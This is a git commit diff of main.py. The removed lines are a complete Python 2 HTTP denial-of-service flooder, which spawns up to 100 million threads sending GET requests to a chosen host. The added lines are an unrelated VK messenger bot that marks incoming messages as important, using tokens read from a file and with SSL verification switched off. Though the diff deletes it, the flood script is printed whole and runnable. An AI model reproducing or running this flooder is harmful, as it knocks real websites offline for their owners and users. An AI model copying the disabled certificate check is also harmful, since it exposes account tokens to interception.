f8d4f8e76bc70e6926ec2422fb85cb65ced920c2
YamkaFox <46236371+YamkaFox@users.noreply.github.com>
2019-01-05 07:50:48 +0000

    Add files via upload

--- main.py
+++ main.py
@@ -1,99 +1,117 @@
-# -*- coding: utf-8 -*-
-# Author : YamkaFox
-# All copyrights to TKOS team
+#!/usr/bin/env python3
+# coding=utf-8
 
-import random
-import socket
-import string
-import sys
-import threading
-import time
+import os
+SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
 
-# Parse inputs
-host = ""
-ip = ""
-port = 0
-num_requests = 0
+import asyncio
+import logging
+from textwrap import shorten
 
-if len(sys.argv) == 2:
-    port = 80
-    num_requests = 100000000
-elif len(sys.argv) == 3:
-    port = int(sys.argv[2])
-    num_requests = 100000000
-elif len(sys.argv) == 4:
-    port = int(sys.argv[2])
-    num_requests = int(sys.argv[3])
-else:
-    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
-    sys.exit(1)
-
-# Convert FQDN to IP
 try:
-    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
-    ip = socket.gethostbyname(host)
-except socket.gaierror:
-    print " ERROR\n Make sure you entered a correct website"
-    sys.exit(2)
+    import aiohttp
+except ModuleNotFoundError:
+    import sys
+    import subprocess
+    print("=== Установка зависимостей ===")
+    pip_command = [sys.executable, "-m", "pip", "install", "--no-deps",
+                   "-r", SCRIPT_DIR + "/requirements.txt"]
+    if sys.version_info.minor < 7:  # there's no idna-ssl for python 3.7
+        pip_command.append("idna-ssl==1.0.1")
+    subprocess.check_call(pip_command)
+    import aiohttp
 
-# Create a shared variable for thread counts
-thread_num = 0
-thread_num_mutex = threading.Lock()
+import aiohttp.client_exceptions
 
+import aiovk
+import aiovk.exceptions
+from aiovk.drivers import HttpDriver
+from aiovk.mixins import LimitRateDriverMixin
 
-# Print thread status
-def print_status():
-    global thread_num
-    thread_num_mutex.acquire(True)
+from vk_api.longpoll import Event, VkEventType, VkMessageFlag
 
-    thread_num += 1
-    print "\n " + time.ctime().split(" ")[3] + " " + "[" + str(thread_num) + "] #-#-# Packet has sended#-#-#"
+logging.basicConfig(format="%(asctime)s| %(levelname)s: %(message)s",
+                    datefmt="%H:%M:%S", level=logging.INFO)
 
-    thread_num_mutex.release()
-
-
-# Generate URL Path
-def generate_url_path():
-    msg = str(string.letters + string.digits + string.punctuation)
-    data = "".join(random.sample(msg, 5))
-    return data
-
-
-# Perform the request
-def attack():
-    print_status()
-    url_path = generate_url_path()
-
-    # Create a raw socket
-    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-    try:
-        # Open the connection on that raw socket
-        dos.connect((ip, port))
-
-        # Send the request according to HTTP spec
-        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-        dos.send("GET /%s HTTP/1.1\nHost: %s\n\n" % (url_path, host))
-    except socket.error, e:
-        print "\n [ No connection, server may be down ]: " + str(e)
-    finally:
-        # Close our socket gracefully
-        dos.shutdown(socket.SHUT_RDWR)
-        dos.close()
+with open(SCRIPT_DIR + "/README.txt") as readme:
+    print(readme.read())
 
 
-print "[#] Attack started on " + host + " (" + ip + ") || Port: " + str(port) + " || # Requests: " + str(num_requests)
+class LimitRateDriver(LimitRateDriverMixin, HttpDriver):
+    requests_per_period = 3
 
-# Spawn a thread per request
-all_threads = []
-for i in xrange(num_requests):
-    t1 = threading.Thread(target=attack)
-    t1.start()
-    all_threads.append(t1)
 
-    # Adjusting this sleep time will affect requests per second
-    time.sleep(0.001)
+class Account:
+    def __init__(self, token: str):
+        self._token = token
+        self.short_token = self._token[:5]
 
-for current_thread in all_threads:
-    current_thread.join()  # Make the main thread wait for the children threads
+        self.loop = asyncio.get_event_loop()
+        self._session = self.loop.run_until_complete(self._create_session())
+
+        self.api = aiovk.API(self._session)
+        self.longpoll = aiovk.LongPoll(self.api, wait=25, mode=0, version=1)
+
+    async def _create_session(self):
+        connector = aiohttp.TCPConnector(verify_ssl=False)
+        session = aiohttp.ClientSession(connector=connector)
+        driver = LimitRateDriver(loop=self.loop, session=session)
+        return aiovk.TokenSession(access_token=self._token, driver=driver)
+
+    def is_income_message(self, event: Event) -> bool:
+        """Checks whether event is new income not important message"""
+        return (event.type == VkEventType.MESSAGE_NEW and
+                event.to_me and
+                VkMessageFlag.IMPORTANT not in event.message_flags)
+
+    async def listen_income_messages(self) -> Event:
+        while True:
+            try:
+                raw_events = await self.longpoll.wait()
+            except asyncio.TimeoutError:
+                logging.critical("тайм-аут: что-то с интернетом")
+            except (aiovk.exceptions.VkException,
+                    aiohttp.client_exceptions.ClientError) as err:
+                name = type(err).__name__
+                logging.error("%s:ошибка %s: %s", self.short_token, name, err)
+            else:
+                logging.debug("%s:получено %s", self.short_token, raw_events)
+                messages = (Event(raw) for raw in raw_events["updates"]
+                                       if raw[0] == VkEventType.MESSAGE_NEW)
+                income = filter(self.is_income_message, messages)
+                for message in income:
+                    yield message
+
+    async def mark_messages_important(self):
+        async for message in self.listen_income_messages():  # type: Event
+            try:
+                id = message.message_id
+                await self.api.messages.markAsImportant(message_ids=id,
+                                                        important=1)
+            except asyncio.TimeoutError:
+                logging.critical("тайм-аут: что-то с интернетом")
+            except (aiovk.exceptions.VkException,
+                    aiohttp.client_exceptions.ClientError) as err:
+                name = type(err).__name__
+                logging.error("%s:ошибка %s: %s", self.short_token, name, err)
+            else:
+                text = shorten(message.text, width=25)
+                if text == "[...]":  # for very long single words
+                    text = message.text[:20] + "[...]"
+                logging.info("%s:обработано: %s", self.short_token, text)
+
+
+tokens_filename = SCRIPT_DIR + "/tokens.txt"
+open(tokens_filename, 'a').close()  # create file if not exists
+
+with open(tokens_filename) as tokens_file:
+    tokens = [token.strip() for token in tokens_file if token.strip()]
+
+for token in tokens:
+    account = Account(token)
+    asyncio.ensure_future(account.mark_messages_important())
+    logging.info("%s:аккаунт добавлен", account.short_token)
+
+logging.getLogger("asyncio").setLevel(logging.WARNING)
+loop: asyncio.AbstractEventLoop = asyncio.get_event_loop()
+loop.run_forever()
